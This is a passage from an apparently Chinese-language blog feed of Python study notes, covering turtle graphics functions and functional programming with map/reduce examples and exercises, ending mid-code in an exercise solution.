指<code>红蓝绿</code>三个通道的颜色组合</li><li>覆盖视力所能感知的所有颜色</li><li>RGB 每色取值范围 0～255 整数或 0-1 小数</li></ul><p><img src="https://cos.gjcloak.xyz/01/image-20200922111016351.png" alt="image-20200922111016351" title="image-20200922111016351"></p><p><img src="https://cos.gjcloak.xyz/01/image-20200922125919301.png" alt="image-20200922125919301" title="image-20200922125919301"></p><p><strong>默认采用小数值，可切换为整数值</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">turtle.colormode(mode)</span><br></pre></td></tr></table></figure><ul><li>1.0：RGB 小数值模式</li><li>255：RGB 整数值模式</li></ul><h4 id="⑦-turtle-程序语法元素分析"><a href="#⑦-turtle-程序语法元素分析" class="headerlink" title="⑦ turtle 程序语法元素分析"></a>⑦ turtle 程序语法元素分析</h4><p>（1）库引用和 import</p><p><strong>库引用</strong>：扩充 Python 程序功能的方式</p><p>使用 import 保留字完成，采用 <code>&lt;a&gt;.&lt;b&gt;()</code> 编码风格</p><p>使用方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import &lt;库名&gt;</span><br><span class="line">&lt;库名&gt;.&lt;函数名&gt;(&lt;函数参数&gt;)</span><br></pre></td></tr></table></figure><blockquote><p>其他 import 用法：</p></blockquote><p>使用 from 和 import 保留字共同完成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from &lt;库名&gt; import &lt;函数名&gt;</span><br><span class="line">from &lt;库名&gt; import *</span><br><span class="line">&lt;函数名&gt;(&lt;函数参数&gt;)</span><br></pre></td></tr></table></figure><p>? 两种方法比较：</p><p><img src="https://cos.gjcloak.xyz/01/image-20200922131657337.png" alt="比较" title="比较"></p><p>所以，推荐使用下面的 import 用法：</p><p><strong>使用 import 和 as 保留字共同完成</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import &lt;库名&gt; as &lt;库别名&gt;</span><br><span class="line">&lt;库别名&gt;.&lt;函数名&gt;(&lt;函数参数&gt;)</span><br></pre></td></tr></table></figure><blockquote><p>好处：</p></blockquote><ul><li>给调用的外部库关联一个更短、更适合自己的名字。</li></ul><p>（2）画笔控制函数</p><p><strong>画笔操作后一直有效，一般成对出现</strong></p><p><code>turtle.penup()</code> 别名 <code>turtle.pu()</code></p><p>抬起画笔，海龟在飞行</p><p><code>turtle.pendown()</code> 别名 <code>turtle.pd()</code></p><p><strong>画笔设置后一直有效，直至下次重新设置</strong></p><p><code>turtle.pensize()</code> 别名 <code>turtle.width(width)</code></p><p>画笔宽度，海龟的腰围。</p><p><code>turtle.pencolor(color)</code> color 为颜色字符串或 r,g,b 值</p><p>画笔颜色，海龟在涂装</p><p>（3）运动控制函数</p><p><strong>控制海龟行进：走直线 &amp; 走曲线</strong></p><p><code>turtle.forward(d)</code> 别名 <code>turtle.fd(d)</code></p><p>向前行进，海龟走直线</p><p><code>d</code>：行进距离，可以为负数</p><p><code>turtle.circle(r,extent=None)</code></p><p>根据半径 r 绘制 extent 角度的弧形</p><p><code>r</code>：默认圆心在海龟左侧 r 距离的位置</p><p><code>extent</code>：绘制角度，默认是 360 度整圆</p><blockquote><p>举例：</p></blockquote><p><img src="https://cos.gjcloak.xyz/01/image-20200923112538907.png" alt="image-20200923112538907" title="image-20200923112538907"></p><p>（4）方向控制函数</p><p><strong>控制海龟面对方向：绝对角度 &amp; 海龟角度</strong></p><p><code>turtle.setheading(angle)</code> 别名 <code>turtle.seth(angle)</code></p><p>改变行进方向，海龟走角度</p><p><code>angle</code>：改变行进方向，海龟走角度</p><h2 id="5-4-参考资料"><a href="#5-4-参考资料" class="headerlink" title="5.4 参考资料"></a>5.4 参考资料</h2><ul><li><a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017454145014176">廖雪峰 - Python 3.x - 模块</a></li><li><a href="https://www.icourse163.org/learn/BIT-268001?tid=1460270441#/learn/content">Python 语言程序设计 - 北京理工大学</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 模块 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习笔记(四)·函数式编程</title>
      <link href="/97.html"/>
      <url>/97.html</url>
      
        <content type="html"><![CDATA[<p>函数是 Python 内建支持的一种封装，我们通过把大段代码拆成函数，通过一层一层的函数调用，就可以把复杂任务分解成简单的任务，这种分解可以称之为面向过程的程序设计。函数就是面向过程的程序设计的基本单元。</p><p>而函数式编程（请注意多了一个“式”字）—— Functional Programming，虽然也可以归结到面向过程的程序设计，但其思想更接近数学计算。</p><p>我们首先要搞明白计算机（Computer）和计算（Compute）的概念。</p><p>在计算机的层次上，CPU 执行的是加减乘除的<code>指令代码</code>，以及各种条件判断和跳转指令，所以，汇编语言是最贴近计算机的语言。</p><p>而计算则指数学意义上的计算，越是抽象的计算，离计算机硬件越远。</p><p>对应到编程语言，就是越低级的语言，越贴近计算机，抽象程度低，执行效率高，比如 C 语言；越高级的语言，越贴近计算，抽象程度高，执行效率低，比如 Lisp 语言。</p><blockquote><p>?? 诞生 50 多年之后，函数式编程（functional programming）开始获得越来越多的关注。不仅最古老的函数式语言 Lisp 重获青春，而且新的函数式语言层出不穷，比如 Erlang、clojure、Scala、F# 等等。目前最当红的 Python、Ruby、Javascript，对函数式编程的支持都很强，就连老牌的面向对象的 Java、面向过程的 PHP，都忙不迭地加入对匿名函数的支持。越来越多的迹象表明，函数式编程已经不再是学术界的最爱，开始大踏步地在业界投入实用。也许继”面向对象编程”之后，”函数式编程”会成为下一个编程的主流范式（paradigm）。</p></blockquote><h2 id="4-1-什么是函数式编程"><a href="#4-1-什么是函数式编程" class="headerlink" title="4.1 什么是函数式编程"></a>4.1 什么是函数式编程</h2><p>函数式编程就是一种抽象程度很高的编程范式，纯粹的函数式编程语言编写的函数没有变量，因此，任意一个函数，只要输入是确定的，输出就是确定的，这种纯函数我们称之为没有副作用。而允许使用变量的程序设计语言，由于函数内部的变量状态不确定，同样的输入，可能得到不同的输出，因此，这种函数是有副作用的。</p><p>? 函数式编程的一个特点就是，允许把函数本身作为参数传入另一个函数，还允许返回一个函数！</p><p>Python 对函数式编程提供部分支持。由于 Python 允许使用变量，因此，Python 不是纯函数式编程语言。</p><h3 id="4-1-1-定义"><a href="#4-1-1-定义" class="headerlink" title="4.1.1 定义"></a>4.1.1 定义</h3><p>简单说，”函数式编程”是一种”编程范式”（programming paradigm），也就是如何编写程序的方法论。它属于”结构化编程”的一种，主要思想是把运算过程尽量写成一系列嵌套的函数调用。</p><p>举例来说，现在有这样一个数学表达式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(1 + 2) * 3 - 4</span><br></pre></td></tr></table></figure><p>传统的过程式编程，可能这样写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var a = 1 + 2;</span><br><span class="line">var b = a * 3;</span><br><span class="line">var c = b - 4;</span><br></pre></td></tr></table></figure><p>函数式编程要求使用函数，我们可以把<strong>运算过程</strong>定义为不同的函数，然后写成下面这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var result = subtract(multiply(add(1,2), 3), 4);</span><br></pre></td></tr></table></figure><p>这就是函数式编程。</p><h3 id="4-1-2-特点"><a href="#4-1-2-特点" class="headerlink" title="4.1.2 特点"></a>4.1.2 特点</h3><p>函数式编程具有五个鲜明的特点。</p><h4 id="①-函数是”第一等公民”"><a href="#①-函数是”第一等公民”" class="headerlink" title="① 函数是”第一等公民”"></a>① 函数是”第一等公民”</h4><p>所谓”第一等公民”（first class），指的是函数与其他数据类型一样，处于平等地位，可以赋值给其他变量，也可以作为参数，传入另一个函数，或者作为别的函数的返回值。</p><p>举例来说，下面代码中的 print 变量就是一个函数，可以作为另一个函数的参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var print = function(i)&#123; </span><br><span class="line">    console.log(i);</span><br><span class="line">&#125;;</span><br><span class="line">[1,2,3].forEach(print);</span><br></pre></td></tr></table></figure><h4 id="②-只用”表达式”，不用”语句”"><a href="#②-只用”表达式”，不用”语句”" class="headerlink" title="② 只用”表达式”，不用”语句”"></a>② 只用”表达式”，不用”语句”</h4><p>“表达式”（expression）是一个单纯的运算过程，总是有返回值；”语句”（statement）是执行某种操作，没有返回值。函数式编程要求，只使用表达式，不使用语句。也就是说，每一步都是单纯的运算，而且都有返回值。</p><p>原因是函数式编程的开发动机，一开始就是为了处理运算（computation），不考虑系统的读写（I&#x2F;O）。”语句”属于对系统的读写操作，所以就被排斥在外。</p><p>当然，实际应用中，不做 I&#x2F;O 是不可能的。因此，编程过程中，函数式编程只要求把 I&#x2F;O 限制到最小，不要有不必要的读写行为，保持计算过程的单纯性。</p><h4 id="③-没有”副作用”"><a href="#③-没有”副作用”" class="headerlink" title="③ 没有”副作用”"></a>③ 没有”副作用”</h4><p>所谓<a href="http://en.wikipedia.org/wiki/Side_effect_(computer_science)">“副作用”</a>（side effect），指的是函数内部与外部互动（最典型的情况，就是修改全局变量的值），产生运算以外的其他结果。</p><p>函数式编程强调没有”副作用”，意味着函数要保持独立，所有功能就是返回一个新的值，没有其他行为，尤其是不得修改外部变量的值。</p><h4 id="④-不修改状态"><a href="#④-不修改状态" class="headerlink" title="④ 不修改状态"></a>④ 不修改状态</h4><p>上一点已经提到，函数式编程只是返回新的值，不修改系统变量。因此，不修改变量，也是它的一个重要特点。</p><p>在其他类型的语言中，变量往往用来保存”状态”（state）。不修改变量，意味着状态不能保存在变量中。函数式编程使用参数保存状态，最好的例子就是递归。下面的代码是一个将字符串逆序排列的函数，它演示了不同的参数如何决定了运算所处的”状态”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function reverse(string) &#123;</span><br><span class="line">　　　　if(string.length == 0) &#123;</span><br><span class="line">　　　　　　return string;</span><br><span class="line">　　　　&#125; else &#123;</span><br><span class="line">　　　　　　return reverse(string.substring(1, string.length)) + string.substring(0, 1);</span><br><span class="line">　　　　&#125;</span><br><span class="line">　　&#125;</span><br></pre></td></tr></table></figure><p>由于使用了递归，函数式语言的运行速度比较慢，这是它长期不能在业界推广的主要原因。</p><h4 id="⑤-引用透明"><a href="#⑤-引用透明" class="headerlink" title="⑤ 引用透明"></a>⑤ 引用透明</h4><p>引用透明（Referential transparency），指的是函数的运行不依赖于外部变量或”状态”，只依赖于输入的参数，任何时候只要参数相同，引用函数所得到的返回值总是相同的。</p><p>有了前面的第三点和第四点，这点是很显然的。其他类型的语言，函数的返回值往往与系统状态有关，不同的状态之下，返回值是不一样的。这就叫”引用不透明”，很不利于观察和理解程序的行为。</p><h3 id="4-1-3-好处"><a href="#4-1-3-好处" class="headerlink" title="4.1.3 好处"></a>4.1.3 好处</h3><p>函数式编程到底有什么好处，为什么会变得越来越流行？</p><h4 id="①-代码简洁，开发快速"><a href="#①-代码简洁，开发快速" class="headerlink" title="① 代码简洁，开发快速"></a>① 代码简洁，开发快速</h4><p>函数式编程大量使用函数，减少了代码的重复，因此程序比较短，开发速度较快。</p><h4 id="②-接近自然语言，易于理解"><a href="#②-接近自然语言，易于理解" class="headerlink" title="② 接近自然语言，易于理解"></a>② 接近自然语言，易于理解</h4><p>函数式编程的自由度很高，可以写出很接近自然语言的代码。</p><p>前文曾经将表达式 (1 + 2) * 3 - 4，写成函数式语言：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">subtract(multiply(add(1,2), 3), 4)</span><br></pre></td></tr></table></figure><p>对它进行变形，不难得到另一种写法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(1,2).multiply(3).subtract(4)</span><br></pre></td></tr></table></figure><p>这基本就是自然语言的表达了。再看下面的代码，大家应该一眼就能明白它的意思吧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">merge([1,2],[3,4]).sort().search(&quot;2&quot;)</span><br></pre></td></tr></table></figure><p>因此，函数式编程的代码更容易理解。</p><h4 id="③-更方便的代码管理"><a href="#③-更方便的代码管理" class="headerlink" title="③ 更方便的代码管理"></a>③ 更方便的代码管理</h4><p>函数式编程不依赖、也不会改变外界的状态，只要给定输入参数，返回的结果必定相同。因此，每一个函数都可以被看做独立单元，很有利于进行单元测试（unit testing）和除错（debugging），以及模块化组合。</p><h4 id="④-易于”并发编程”"><a href="#④-易于”并发编程”" class="headerlink" title="④ 易于”并发编程”"></a>④ 易于”并发编程”</h4><p>函数式编程不需要考虑”死锁”（deadlock），因为它不修改变量，所以根本不存在”锁”线程的问题。不必担心一个线程的数据，被另一个线程修改，所以可以很放心地把工作分摊到多个线程，部署”并发编程”（concurrency）。</p><p>请看下面的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var s1 = Op1();</span><br><span class="line">var s2 = Op2();</span><br><span class="line">var s3 = concat(s1, s2);</span><br></pre></td></tr></table></figure><p>由于 s1 和 s2 互不干扰，不会修改变量，谁先执行是无所谓的，所以可以放心地增加线程，把它们分配在两个线程上完成。其他类型的语言就做不到这一点，因为 s1 可能会修改系统状态，而 s2 可能会用到这些状态，所以必须保证 s2 在 s1 之后运行，自然也就不能部署到其他线程上了。</p><p>多核 CPU 是将来的潮流，所以函数式编程的这个特性非常重要。</p><h4 id="⑤-代码的热升级"><a href="#⑤-代码的热升级" class="headerlink" title="⑤ 代码的热升级"></a>⑤ 代码的热升级</h4><p>函数式编程没有副作用，只要保证接口不变，内部实现是外部无关的。所以，可以在运行状态下直接升级代码，不需要重启，也不需要停机。<a href="http://en.wikipedia.org/wiki/Erlang_(programming_language)">Erlang</a> 语言早就证明了这一点，它是瑞典爱立信公司为了管理电话系统而开发的，电话系统的升级当然是不能停机的。</p><blockquote><p>下面进行具体函数具体示例介绍：</p></blockquote><h2 id="4-2-高阶函数"><a href="#4-2-高阶函数" class="headerlink" title="4.2 高阶函数"></a>4.2 高阶函数</h2><p>高阶函数英文叫 Higher-order function。什么是高阶函数？我们以实际代码为例子，一步一步深入概念。</p><p><strong>（1）变量可以指向函数</strong></p><p>以 Python 内置的求绝对值的函数<code>abs()</code>为例，调用该函数用以下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abs(-10) # 10</span><br></pre></td></tr></table></figure><p>但是，如果只写<code>abs</code>呢？</p><p><img src="https://cos.gjcloak.xyz/images01/20200717093944.png" alt="函数" title="函数"></p><p>可见，<code>abs(-10)</code>是函数调用，而<code>abs</code>是函数本身。</p><p>要获得函数调用结果，我们可以把结果赋值给变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = abs(-10)</span><br><span class="line">x # 10</span><br></pre></td></tr></table></figure><p>但是，如果把函数本身赋值给变量呢？</p><p><img src="https://cos.gjcloak.xyz/images01/20200717102556.png" alt="image-20200717102554966" title="image-20200717102554966"></p><p>结论：函数本身也可以赋值给变量，即：变量可以指向函数。</p><p>如果一个变量指向了一个函数，那么，可否通过该变量来调用这个函数？用代码验证一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f = abs</span><br><span class="line">f(10) # 10</span><br></pre></td></tr></table></figure><p>成功！说明变量<code>f</code>现在已经指向了<code>abs</code>函数本身。直接调用<code>abs()</code>函数和调用变量<code>f()</code>完全相同。</p><p><strong>（2）函数名也是变量</strong></p><p>那么函数名是什么呢？函数名其实就是指向函数的变量！对于<code>abs()</code>这个函数，完全可以把函数名<code>abs</code>看成变量，它指向一个可以计算绝对值的函数！</p><p>如果把<code>abs</code>指向其他对象，会有什么情况发生？</p><p><img src="https://cos.gjcloak.xyz/images01/20200717103810.png" alt="报错" title="报错"></p><p>把<code>abs</code>指向<code>10</code>后，就无法通过<code>abs(-10)</code>调用该函数了！因为<code>abs</code>这个变量已经不指向求绝对值函数而是指向一个整数<code>10</code>！</p><p>当然实际代码绝对不能这么写，这里是为了说明函数名也是变量。要恢复<code>abs</code>函数，请重启 Python 交互环境。</p><p>注：由于<code>abs</code>函数实际上是定义在<code>import builtins</code>模块中的，所以要让修改<code>abs</code>变量的指向在其它模块也生效，要用<code>import builtins; builtins.abs = 10</code>。</p><p><strong>（3）传入函数</strong></p><p>既然变量可以指向函数，函数的参数能接收变量，那么一个函数就可以接收另一个函数作为参数，这种函数就称之为高阶函数。</p><p>一个最简单的高阶函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def add(x, y, f):</span><br><span class="line">    return f(x) + f(y)</span><br></pre></td></tr></table></figure><p>当我们调用<code>add(-5, 6, abs)</code>时，参数<code>x</code>，<code>y</code>和<code>f</code>分别接收<code>-5</code>，<code>6</code>和<code>abs</code>，根据函数定义，我们可以推导计算过程为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x = -5</span><br><span class="line">y = 6</span><br><span class="line">f = abs</span><br><span class="line">f(x) + f(y) ==&gt; abs(-5) + abs(6) ==&gt; 11</span><br><span class="line">return 11</span><br></pre></td></tr></table></figure><p>验证一下：</p><p><img src="https://cos.gjcloak.xyz/images01/20200717104540.png" alt="效果图" title="效果图"></p><p>? 编写高阶函数，就是让函数的参数能够接收别的函数。</p><blockquote><p>小结：</p></blockquote><p>把函数作为参数传入，这样的函数称为高阶函数，函数式编程就是指这种高度抽象的编程范式。</p><h3 id="4-2-1-map-reduce"><a href="#4-2-1-map-reduce" class="headerlink" title="4.2.1 map&#x2F;reduce"></a>4.2.1 map&#x2F;reduce</h3><p>Python 内建了<code>map()</code>和<code>reduce()</code>函数。</p><p>如果你读过 Google 的那篇大名鼎鼎的论文“<a href="http://research.google.com/archive/mapreduce.html">MapReduce: Simplified Data Processing on Large Clusters</a>”，你就能大概明白 map&#x2F;reduce 的概念。</p><h4 id="①-map"><a href="#①-map" class="headerlink" title="① map"></a>① map</h4><p>我们先看 map。<code>map()</code>函数接收两个参数，一个是函数，一个是<code>Iterable</code>，<code>map</code>将传入的函数依次作用到序列的每个元素，并把结果作为新的<code>Iterator</code>返回。</p><p>举例说明，比如我们有一个函数 $ f(x)&#x3D;x^2$，要把这个函数作用在一个 list <code>[1, 2, 3, 4, 5, 6, 7, 8, 9]</code>上，就可以用<code>map()</code>实现如下：</p><p><img src="https://cos.gjcloak.xyz/images01/20200717105309.png" alt="image-20200717105308037" title="image-20200717105308037"></p><p>现在，我们用 Python 代码实现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def f(x):</span><br><span class="line">    return x * x</span><br><span class="line">r = map(f, [1, 2, 3, 4, 5, 6, 7, 8, 9])</span><br><span class="line">list(r)</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/images01/20200717105515.png" alt="image-20200717105513962" title="image-20200717105513962"></p><p><code>map()</code>传入的第一个参数是<code>f</code>，即函数对象本身。由于结果<code>r</code>是一个<code>Iterator</code>，<code>Iterator</code>是惰性序列，因此通过<code>list()</code>函数让它把整个序列都计算出来并返回一个list。</p><p>你可能会想，不需要<code>map()</code>函数，写一个循环，也可以计算出结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">L = []</span><br><span class="line">for n in [1, 2, 3, 4, 5, 6, 7, 8, 9]:</span><br><span class="line">    L.append(f(n))</span><br><span class="line">print(L)</span><br></pre></td></tr></table></figure><p>的确可以，但是，从上面的循环代码，能一眼看明白“把 f(x) 作用在 list 的每一个元素并把结果生成一个新的 list”吗？</p><p>所以，<code>map()</code>作为高阶函数，事实上它把运算规则抽象了，因此，我们不但可以计算简单的 $ f(x)&#x3D;x^2$，还可以计算任意复杂的函数，比如，把这个 list 所有数字转为字符串：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list(map(str, [1, 2, 3, 4, 5, 6, 7, 8, 9]))</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/images01/20200717110351.png" alt="image-20200717110350309" title="image-20200717110350309"></p><p>只需要一行代码。</p><h4 id="②-reduce"><a href="#②-reduce" class="headerlink" title="② reduce"></a>② reduce</h4><p>再看<code>reduce</code>的用法。<code>reduce</code>把一个函数作用在一个序列<code>[x1, x2, x3, ...]</code>上，这个函数必须接收两个参数，<code>reduce</code>把结果继续和序列的下一个元素做累积计算，其效果就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reduce(f, [x1, x2, x3, x4]) = f(f(f(x1, x2), x3), x4)</span><br></pre></td></tr></table></figure><p>比方说对一个序列求和，就可以用<code>reduce</code>实现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from functools import reduce</span><br><span class="line">def add(x, y):</span><br><span class="line">    return x + y</span><br><span class="line">reduce(add, [1, 3, 5, 7, 9]) # 25</span><br></pre></td></tr></table></figure><p>当然求和运算可以直接用 Python 内建函数<code>sum()</code>，没必要动用<code>reduce</code>。</p><p>但是如果要把序列<code>[1, 3, 5, 7, 9]</code>变换成整数<code>13579</code>，<code>reduce</code>就可以派上用场：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from functools import reduce</span><br><span class="line">def fn(x, y):</span><br><span class="line">    return x * 10 + y</span><br><span class="line">reduce(fn, [1, 3, 5, 7, 9]) # 13579</span><br></pre></td></tr></table></figure><p>这个例子本身没多大用处，但是，如果考虑到字符串<code>str</code>也是一个序列，对上面的例子稍加改动，配合<code>map()</code>，我们就可以写出把<code>str</code>转换为<code>int</code>的函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from functools import reduce</span><br><span class="line">def fn(x, y):</span><br><span class="line">    return x * 10 + y</span><br><span class="line">def char2num(s):</span><br><span class="line">    digits = &#123;&#x27;0&#x27;: 0, &#x27;1&#x27;: 1, &#x27;2&#x27;: 2, &#x27;3&#x27;: 3, &#x27;4&#x27;: 4, &#x27;5&#x27;: 5, &#x27;6&#x27;: 6, &#x27;7&#x27;: 7, &#x27;8&#x27;: 8, &#x27;9&#x27;: 9&#125;</span><br><span class="line">    return digits[s]</span><br><span class="line">reduce(fn, map(char2num, &#x27;13579&#x27;)) # 13579</span><br></pre></td></tr></table></figure><p>整理成一个<code>str2int</code>的函数就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from functools import reduce</span><br><span class="line"></span><br><span class="line">DIGITS = &#123;&#x27;0&#x27;: 0, &#x27;1&#x27;: 1, &#x27;2&#x27;: 2, &#x27;3&#x27;: 3, &#x27;4&#x27;: 4, &#x27;5&#x27;: 5, &#x27;6&#x27;: 6, &#x27;7&#x27;: 7, &#x27;8&#x27;: 8, &#x27;9&#x27;: 9&#125;</span><br><span class="line"></span><br><span class="line">def str2int(s):</span><br><span class="line">    def fn(x, y):</span><br><span class="line">        return x * 10 + y</span><br><span class="line">    def char2num(s):</span><br><span class="line">        return DIGITS[s]</span><br><span class="line">    return reduce(fn, map(char2num, s))</span><br></pre></td></tr></table></figure><p>还可以用 lambda 函数进一步简化成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from functools import reduce</span><br><span class="line"></span><br><span class="line">DIGITS = &#123;&#x27;0&#x27;: 0, &#x27;1&#x27;: 1, &#x27;2&#x27;: 2, &#x27;3&#x27;: 3, &#x27;4&#x27;: 4, &#x27;5&#x27;: 5, &#x27;6&#x27;: 6, &#x27;7&#x27;: 7, &#x27;8&#x27;: 8, &#x27;9&#x27;: 9&#125;</span><br><span class="line"></span><br><span class="line">def char2num(s):</span><br><span class="line">    return DIGITS[s]</span><br><span class="line"></span><br><span class="line">def str2int(s):</span><br><span class="line">    return reduce(lambda x, y: x * 10 + y, map(char2num, s))</span><br></pre></td></tr></table></figure><p>也就是说，假设 Python 没有提供<code>int()</code>函数，你完全可以自己写一个把字符串转化为整数的函数，而且只需要几行代码！</p><blockquote><p>练习题：</p></blockquote><p>【第一题】利用<code>map()</code>函数，把用户输入的不规范的英文名字，变为首字母大写，其他小写的规范名字。输入：<code>[&#39;adam&#39;, &#39;LISA&#39;, &#39;barT&#39;]</code>，输出：<code>[&#39;Adam&#39;, &#39;Lisa&#39;, &#39;Bart&#39;]</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def normalize(name):</span><br><span class="line">    return name[0].upper() + name[1:].lower()</span><br></pre></td></tr></table></figure><p>或者也挺好：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def normalize(name):</span><br><span class="line">    return name.title()  #title()函数 首字母大写  其他字母小写</span><br></pre></td></tr></table></figure><p>或者也挺好：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def normalize(name):</span><br><span class="line">    return name.capitalize()</span><br></pre></td></tr></table></figure><p>测试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 测试:</span><br><span class="line">L1 = [&#x27;adam&#x27;, &#x27;LISA&#x27;, &#x27;barT&#x27;]</span><br><span class="line">L2 = list(map(normalize, L1))</span><br><span class="line">print(L2)</span><br></pre></td></tr></table></figure><p>【第二题】Python 提供的<code>sum()</code>函数可以接受一个 list 并求和，请编写一个<code>prod()</code>函数，可以接受一个 list 并利用<code>reduce()</code>求积：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from functools import reduce</span><br><span class="line">def prod(L):</span><br><span class="line">    return reduce(lambda x, y: x * y, L)</span><br></pre></td></tr></table></figure><p>测试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">print(&#x27;3 * 5 * 7 * 9 =&#x27;, prod([3, 5, 7, 9]))</span><br><span class="line">if prod([3, 5, 7, 9]) == 945:</span><br><span class="line">    print(&#x27;测试成功!&#x27;)</span><br><span class="line">else:</span><br><span class="line">    print(&#x27;测试失败!&#x27;)</span><br></pre></td></tr></table></figure><p>【第三题】利用<code>map</code>和<code>reduce</code>编写一个<code>str2float</code>函数，把字符串<code>&#39;123.456&#39;</code>转换成浮点数<code>123.456</code>：</p><p>法一：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from functools import reduce</span><br><span class="line"></span><br><span class="line">def str2float(s):</span><br><span class="line">    digits = &#123;&#x27;0&#x27;: 0, &#x27;1&#x27;: 1, &#x27;2&#x27;: 2, &#x27;3&#x27;: 3, 